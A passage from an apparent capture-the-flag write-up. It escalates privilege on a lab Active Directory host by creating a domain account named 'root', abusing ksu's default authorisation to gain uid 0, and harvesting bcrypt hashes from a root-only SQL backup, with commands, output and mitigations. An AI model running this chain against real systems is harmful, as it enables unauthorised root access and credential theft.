pw = '\"P@ssw0rd123\"'.encode('utf-16-le')
print(base64.b64encode(pw).decode())
"
```

Set the password and enable the account:

```bash
cat > /tmp/setpw.ldif << 'EOF'
dn: CN=root,OU=GiteaMigration,DC=darkzero,DC=ext
changetype: modify
replace: unicodePwd
unicodePwd:: IgBQAEAAcwBzAHcAMAByAGQAMQAyADMAIgA=
-
replace: userAccountControl
userAccountControl: 512
EOF

ldapmodify -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/setpw.ldif
```

Verify the KDC authenticates the account:

```bash
KRB5CCNAME=/tmp/krb5cc_rootuser kinit root@DARKZERO.EXT
KRB5CCNAME=/tmp/krb5cc_rootuser klist
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`sAMAccountName: root`|The account's logon name — **the attack**|Names the domain account `root`|
|`userPrincipalName: root@darkzero.ext`|UPN form of the same identity|The Kerberos-style name|
|`userAccountControl: 514`|`NORMAL_ACCOUNT` + `ACCOUNTDISABLE`|Create disabled, avoiding password-policy checks before a password exists|
|`userAccountControl: 512`|`NORMAL_ACCOUNT` only|Enable the account once the password is set|
|`'"P@ssw0rd123"'.encode('utf-16-le')`|UTF-16LE encoding, wrapped in literal quotes|AD requires this exact format for `unicodePwd`|
|`base64.b64encode(...)`|Base64-encode the binary value|LDIF carries binary attributes as base64|
|`unicodePwd::` (double colon)|LDIF marker for a base64-encoded value|Signals "this is encoded binary, decode it"|
|`-` on its own line|LDIF separator between modify operations|Ends one change, begins the next|
|`KRB5CCNAME=/tmp/krb5cc_rootuser`|Separate credential cache for the new principal|Keeps `svc-runner`'s ticket intact|

Password modification requires an encrypted channel. The GSSAPI SASL layer at SSF 256 satisfies this, so LDAPS is not required despite using port 389.

**Result:**

```
adding new entry "CN=root,OU=GiteaMigration,DC=darkzero,DC=ext"
```

```
IgBQAEAAcwBzAHcAMAByAGQAMQAyADMAIgA=
```

```
modifying entry "CN=root,OU=GiteaMigration,DC=darkzero,DC=ext"
```

```
Password for root@DARKZERO.EXT:
Warning: Your password will expire in less than one hour on Tue 14 Sep 2100 02:48:05 AM UTC
```

```
Ticket cache: FILE:/tmp/krb5cc_rootuser
Default principal: root@DARKZERO.EXT

Valid starting       Expires              Service principal
07/29/2026 14:39:30  07/30/2026 00:39:30  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 08/05/2026 14:39:19
```

**What this gives you:** A fully functional domain account named `root`, with a known password and a valid Kerberos TGT.

**Key findings:**

- **Domain user `root@DARKZERO.EXT` created and authenticated.** The KDC issued a TGT, confirming the account is enabled and the password is accepted.
- Creating the account disabled (`userAccountControl: 514`) and enabling it after setting the password avoids rejection by domain password policy, which cannot be evaluated against an account that has no password.
- Password writes to `unicodePwd` require the value to be UTF-16LE-encoded and wrapped in literal double-quote characters before base64 encoding. Omitting the quotes causes the operation to fail with a constraint violation.
- The GSSAPI SASL layer provides sufficient channel encryption (SSF 256) for AD to accept a password modification over port 389. LDAPS was not required.
- The password-expiry warning dated 2100 reflects an unset `pwdLastSet` on a newly created object and has no operational effect.
- The name `root` carries no special meaning within Active Directory. It is an ordinary domain user with default privileges. Its significance is entirely in how a _Linux_ host interprets that name.
- Reference material for this target performs the same step using `bloodyAD`. That tool is not installed and the host has no internet egress, so native `ldapadd` and `ldapmodify` were used instead — achieving the identical result.

**Next:** Use `ksu` to escalate to local root by authenticating as the newly created domain principal.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.7 — Escalate to local root via `ksu`

**Why this step:** A domain principal named `root` now exists with a known password. On a domain-joined host, `ksu` maps Kerberos principals to local accounts by name, and in the absence of a `.k5login` file the default rule authorises the principal whose name matches the target user.

**Commands:**

Confirm `ksu` is present and check for authorisation files:

```bash
which ksu; ls -la /root/.k5login /home/*/.k5login 2>&1 | head
```

Escalate:

```bash
KRB5CCNAME=/tmp/krb5cc_rootuser ksu root
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ksu`|Kerberos `su` — switch user with ticket-based authorisation|Become another user using a Kerberos ticket instead of their password|
|`KRB5CCNAME=/tmp/krb5cc_rootuser`|Point at the cache holding the `root@DARKZERO.EXT` TGT|Use the ticket for the account just created|
|`root`|Target local account|Become uid 0|
|`.k5login`|Optional file listing principals authorised to become that user|The allow-list — absent here|

**Result:**

```
/usr/bin/ksu
ls: cannot access '/root/.k5login': Permission denied
ls: cannot access '/home/*/.k5login': No such file or directory
```

```
Authenticated root@DARKZERO.EXT
Account root: authorization for root@DARKZERO.EXT successful
Changing uid to root (0)
root@SRV01:/home/svc-runner#
```

**What this gives you:** Full root privileges on SRV01.

**Key findings:**

- **Local root obtained on SRV01.** `ksu` authenticated the ticket for `root@DARKZERO.EXT`, applied its default authorisation rule, and changed uid to 0.
- **No `.k5login` file exists in `/root`.** The `Permission denied` response is itself informative — `ls` could not stat the path because `/root` is mode `0700`, which is a different condition from the file being absent. Had a `.k5login` existed and omitted `root@DARKZERO.EXT`, authorisation would have failed. The absence of any restriction is what makes the default name-matching rule apply.
- No `.k5login` files exist in any user home directory either.
- The escalation required no exploit, no kernel bug, and no misconfigured SUID binary. It exploits a disagreement between two identity systems about what the name `root` refers to.
- The entire chain from `svc-runner` to root used only tooling already present on the host: `ldapadd`, `ldapmodify`, `kinit`, and `ksu`.
<div align="center">
<br>
<br>
</div>

##### `ksu` and cross-realm identity confusion

`ksu` is MIT Kerberos's equivalent of `su`. Rather than prompting for the target account's local password, it asks whether the Kerberos principal you currently hold a ticket for is _authorised_ to assume that local identity.

Authorisation works as follows. If the target user's home directory contains a `.k5login` file, that file lists the principals permitted to become that user, and only those principals qualify. If no `.k5login` exists, `ksu` falls back to a default rule: **the principal whose name matches the target username, in the local realm, is authorised.** So with no `/root/.k5login`, the principal `root@DARKZERO.EXT` is authorised to become local `root`.

The design assumption is that only a domain administrator can create a principal named `root`, and that such an account would be created deliberately for exactly this purpose. That assumption fails the moment any principal can create user objects with names of their choosing.

The deeper issue is that two identity systems are treating the same string as authoritative for different things. To Linux, `root` means uid 0 — the superuser, defined in `/etc/passwd`. To Active Directory, `root` is an ordinary `sAMAccountName` with no special meaning whatsoever; it could equally be `jsmith`. `ksu` bridges them by string comparison, and the bridge inherits the weaker of the two systems' guarantees about who can claim the name.

Two mitigations would each have broken the chain independently. Creating `/root/.k5login` listing only legitimate administrative principals removes the default rule entirely. Restricting or removing the CREATE_CHILD delegation on the GiteaMigration OU removes the ability to create the colliding account. Neither was in place.

**Next:** Enumerate the root filesystem for credentials, backups, and further pivot material.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### #### 4.8 — Recover a deleted user hash from a database backup

**Why this step:** The live users table showed a gap at `id = 2`, indicating a deleted row. Root access permits reading files unavailable to lower-privileged accounts, including database backups predating the deletion.

**Commands:**

```bash
id; hostname; ls -la /root/
```

```bash
find / -name "*.sql*" -o -name "*.bak" -o -name "*.dump" 2>/dev/null | grep -v -E '/proc|/sys|node_modules' | head -20
```

```bash
grep -iA5 'INSERT INTO `users`' /root/darkzero_campaigns_backup.sql | head -20
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`find / -name "*.sql*" -o -name "*.bak" -o -name "*.dump"`|Search the filesystem for backup artefacts|Look for database dumps anywhere on disk|
|`grep -v -E '/proc\|/sys\|node_modules'`|Exclude virtual filesystems and dependency trees|Filter out noise|
|`grep -iA5 'INSERT INTO \`users`'`|Match the users table insert, showing 5 following lines|Pull the user rows out of the dump|

**Result — root's home directory:**

```
lrwxrwxrwx  1 root root     9 May 20 10:33 .bash_history -> /dev/null
-rw-r--r--  1 root root 13451 May 20 10:05 darkzero_campaigns_backup.sql
lrwxrwxrwx  1 root root     9 May 19 14:37 .mysql_history -> /dev/null
drwx------  2 root root  4096 May 20 11:13 .ssh
```

**Result — backup contents:**

sql

```sql
INSERT INTO `users` VALUES (1,'admin@dzcampaigns.htb','admin','$2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm','admin','2026-04-19 15:34:56');
INSERT INTO `users` VALUES (2,'celia.p@dzcampaigns.htb','celia','$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC','player','2026-04-20 17:20:14');
INSERT INTO `users` VALUES (3,'jerry.ap@dzcampaigns.htb','jerry','$2b$10$otSLTatDHIAAp3H58YYaTOgdhMlpbWBTEq1.MWFq5se6OOG3nV2Wy','player','2026-04-20 17:27:37');
```

**What this gives you:** A password hash for an account that no longer exists in the live database.

**Comparison — live table versus backup:**

|id|Live database (3.6)|Backup (May 20)|Status|
|---|---|---|---|
|1|`admin`|`admin`|Unchanged|
|2|_(absent)_|**`celia`**|**Deleted from live — recovered here**|
|3|`josh`|`jerry`|Replaced|
|4|_(our account)_|_(absent)_|Created during this engagement|

**Key findings:**

- **`celia`'s bcrypt hash recovered: `$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC`**, email `celia.p@dzcampaigns.htb`. This row was deleted from the production database and exists only in the backup.
- The gap at `id = 2` observed during the original table dump was the indicator. Sequential primary keys with missing values signal deleted records, and backups are where those records survive.
- The backup is readable only by root (`-rw-r--r--` in `/root`, a `0700` directory). Every prior account on this host was blocked from it; root access was the prerequisite.
- Row 3 differs between backup and live: the backup holds `jerry`, the live table holds `josh`. Seed data was reworked after May 20. `jerry`'s hash is also recoverable but is lower priority.
- `.bash_history` and `.mysql_history` in `/root` are both symlinked to `/dev/null`, so no command history is available.
- Reference material for this target describes locating a SQL backup containing celia's deleted row and identifies celia as a member of Domain Admins in `darkzero.ext`. If that holds here, cracking this hash yields domain administrator credentials.

**Next:** Crack celia's hash and verify her group memberships in the directory.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

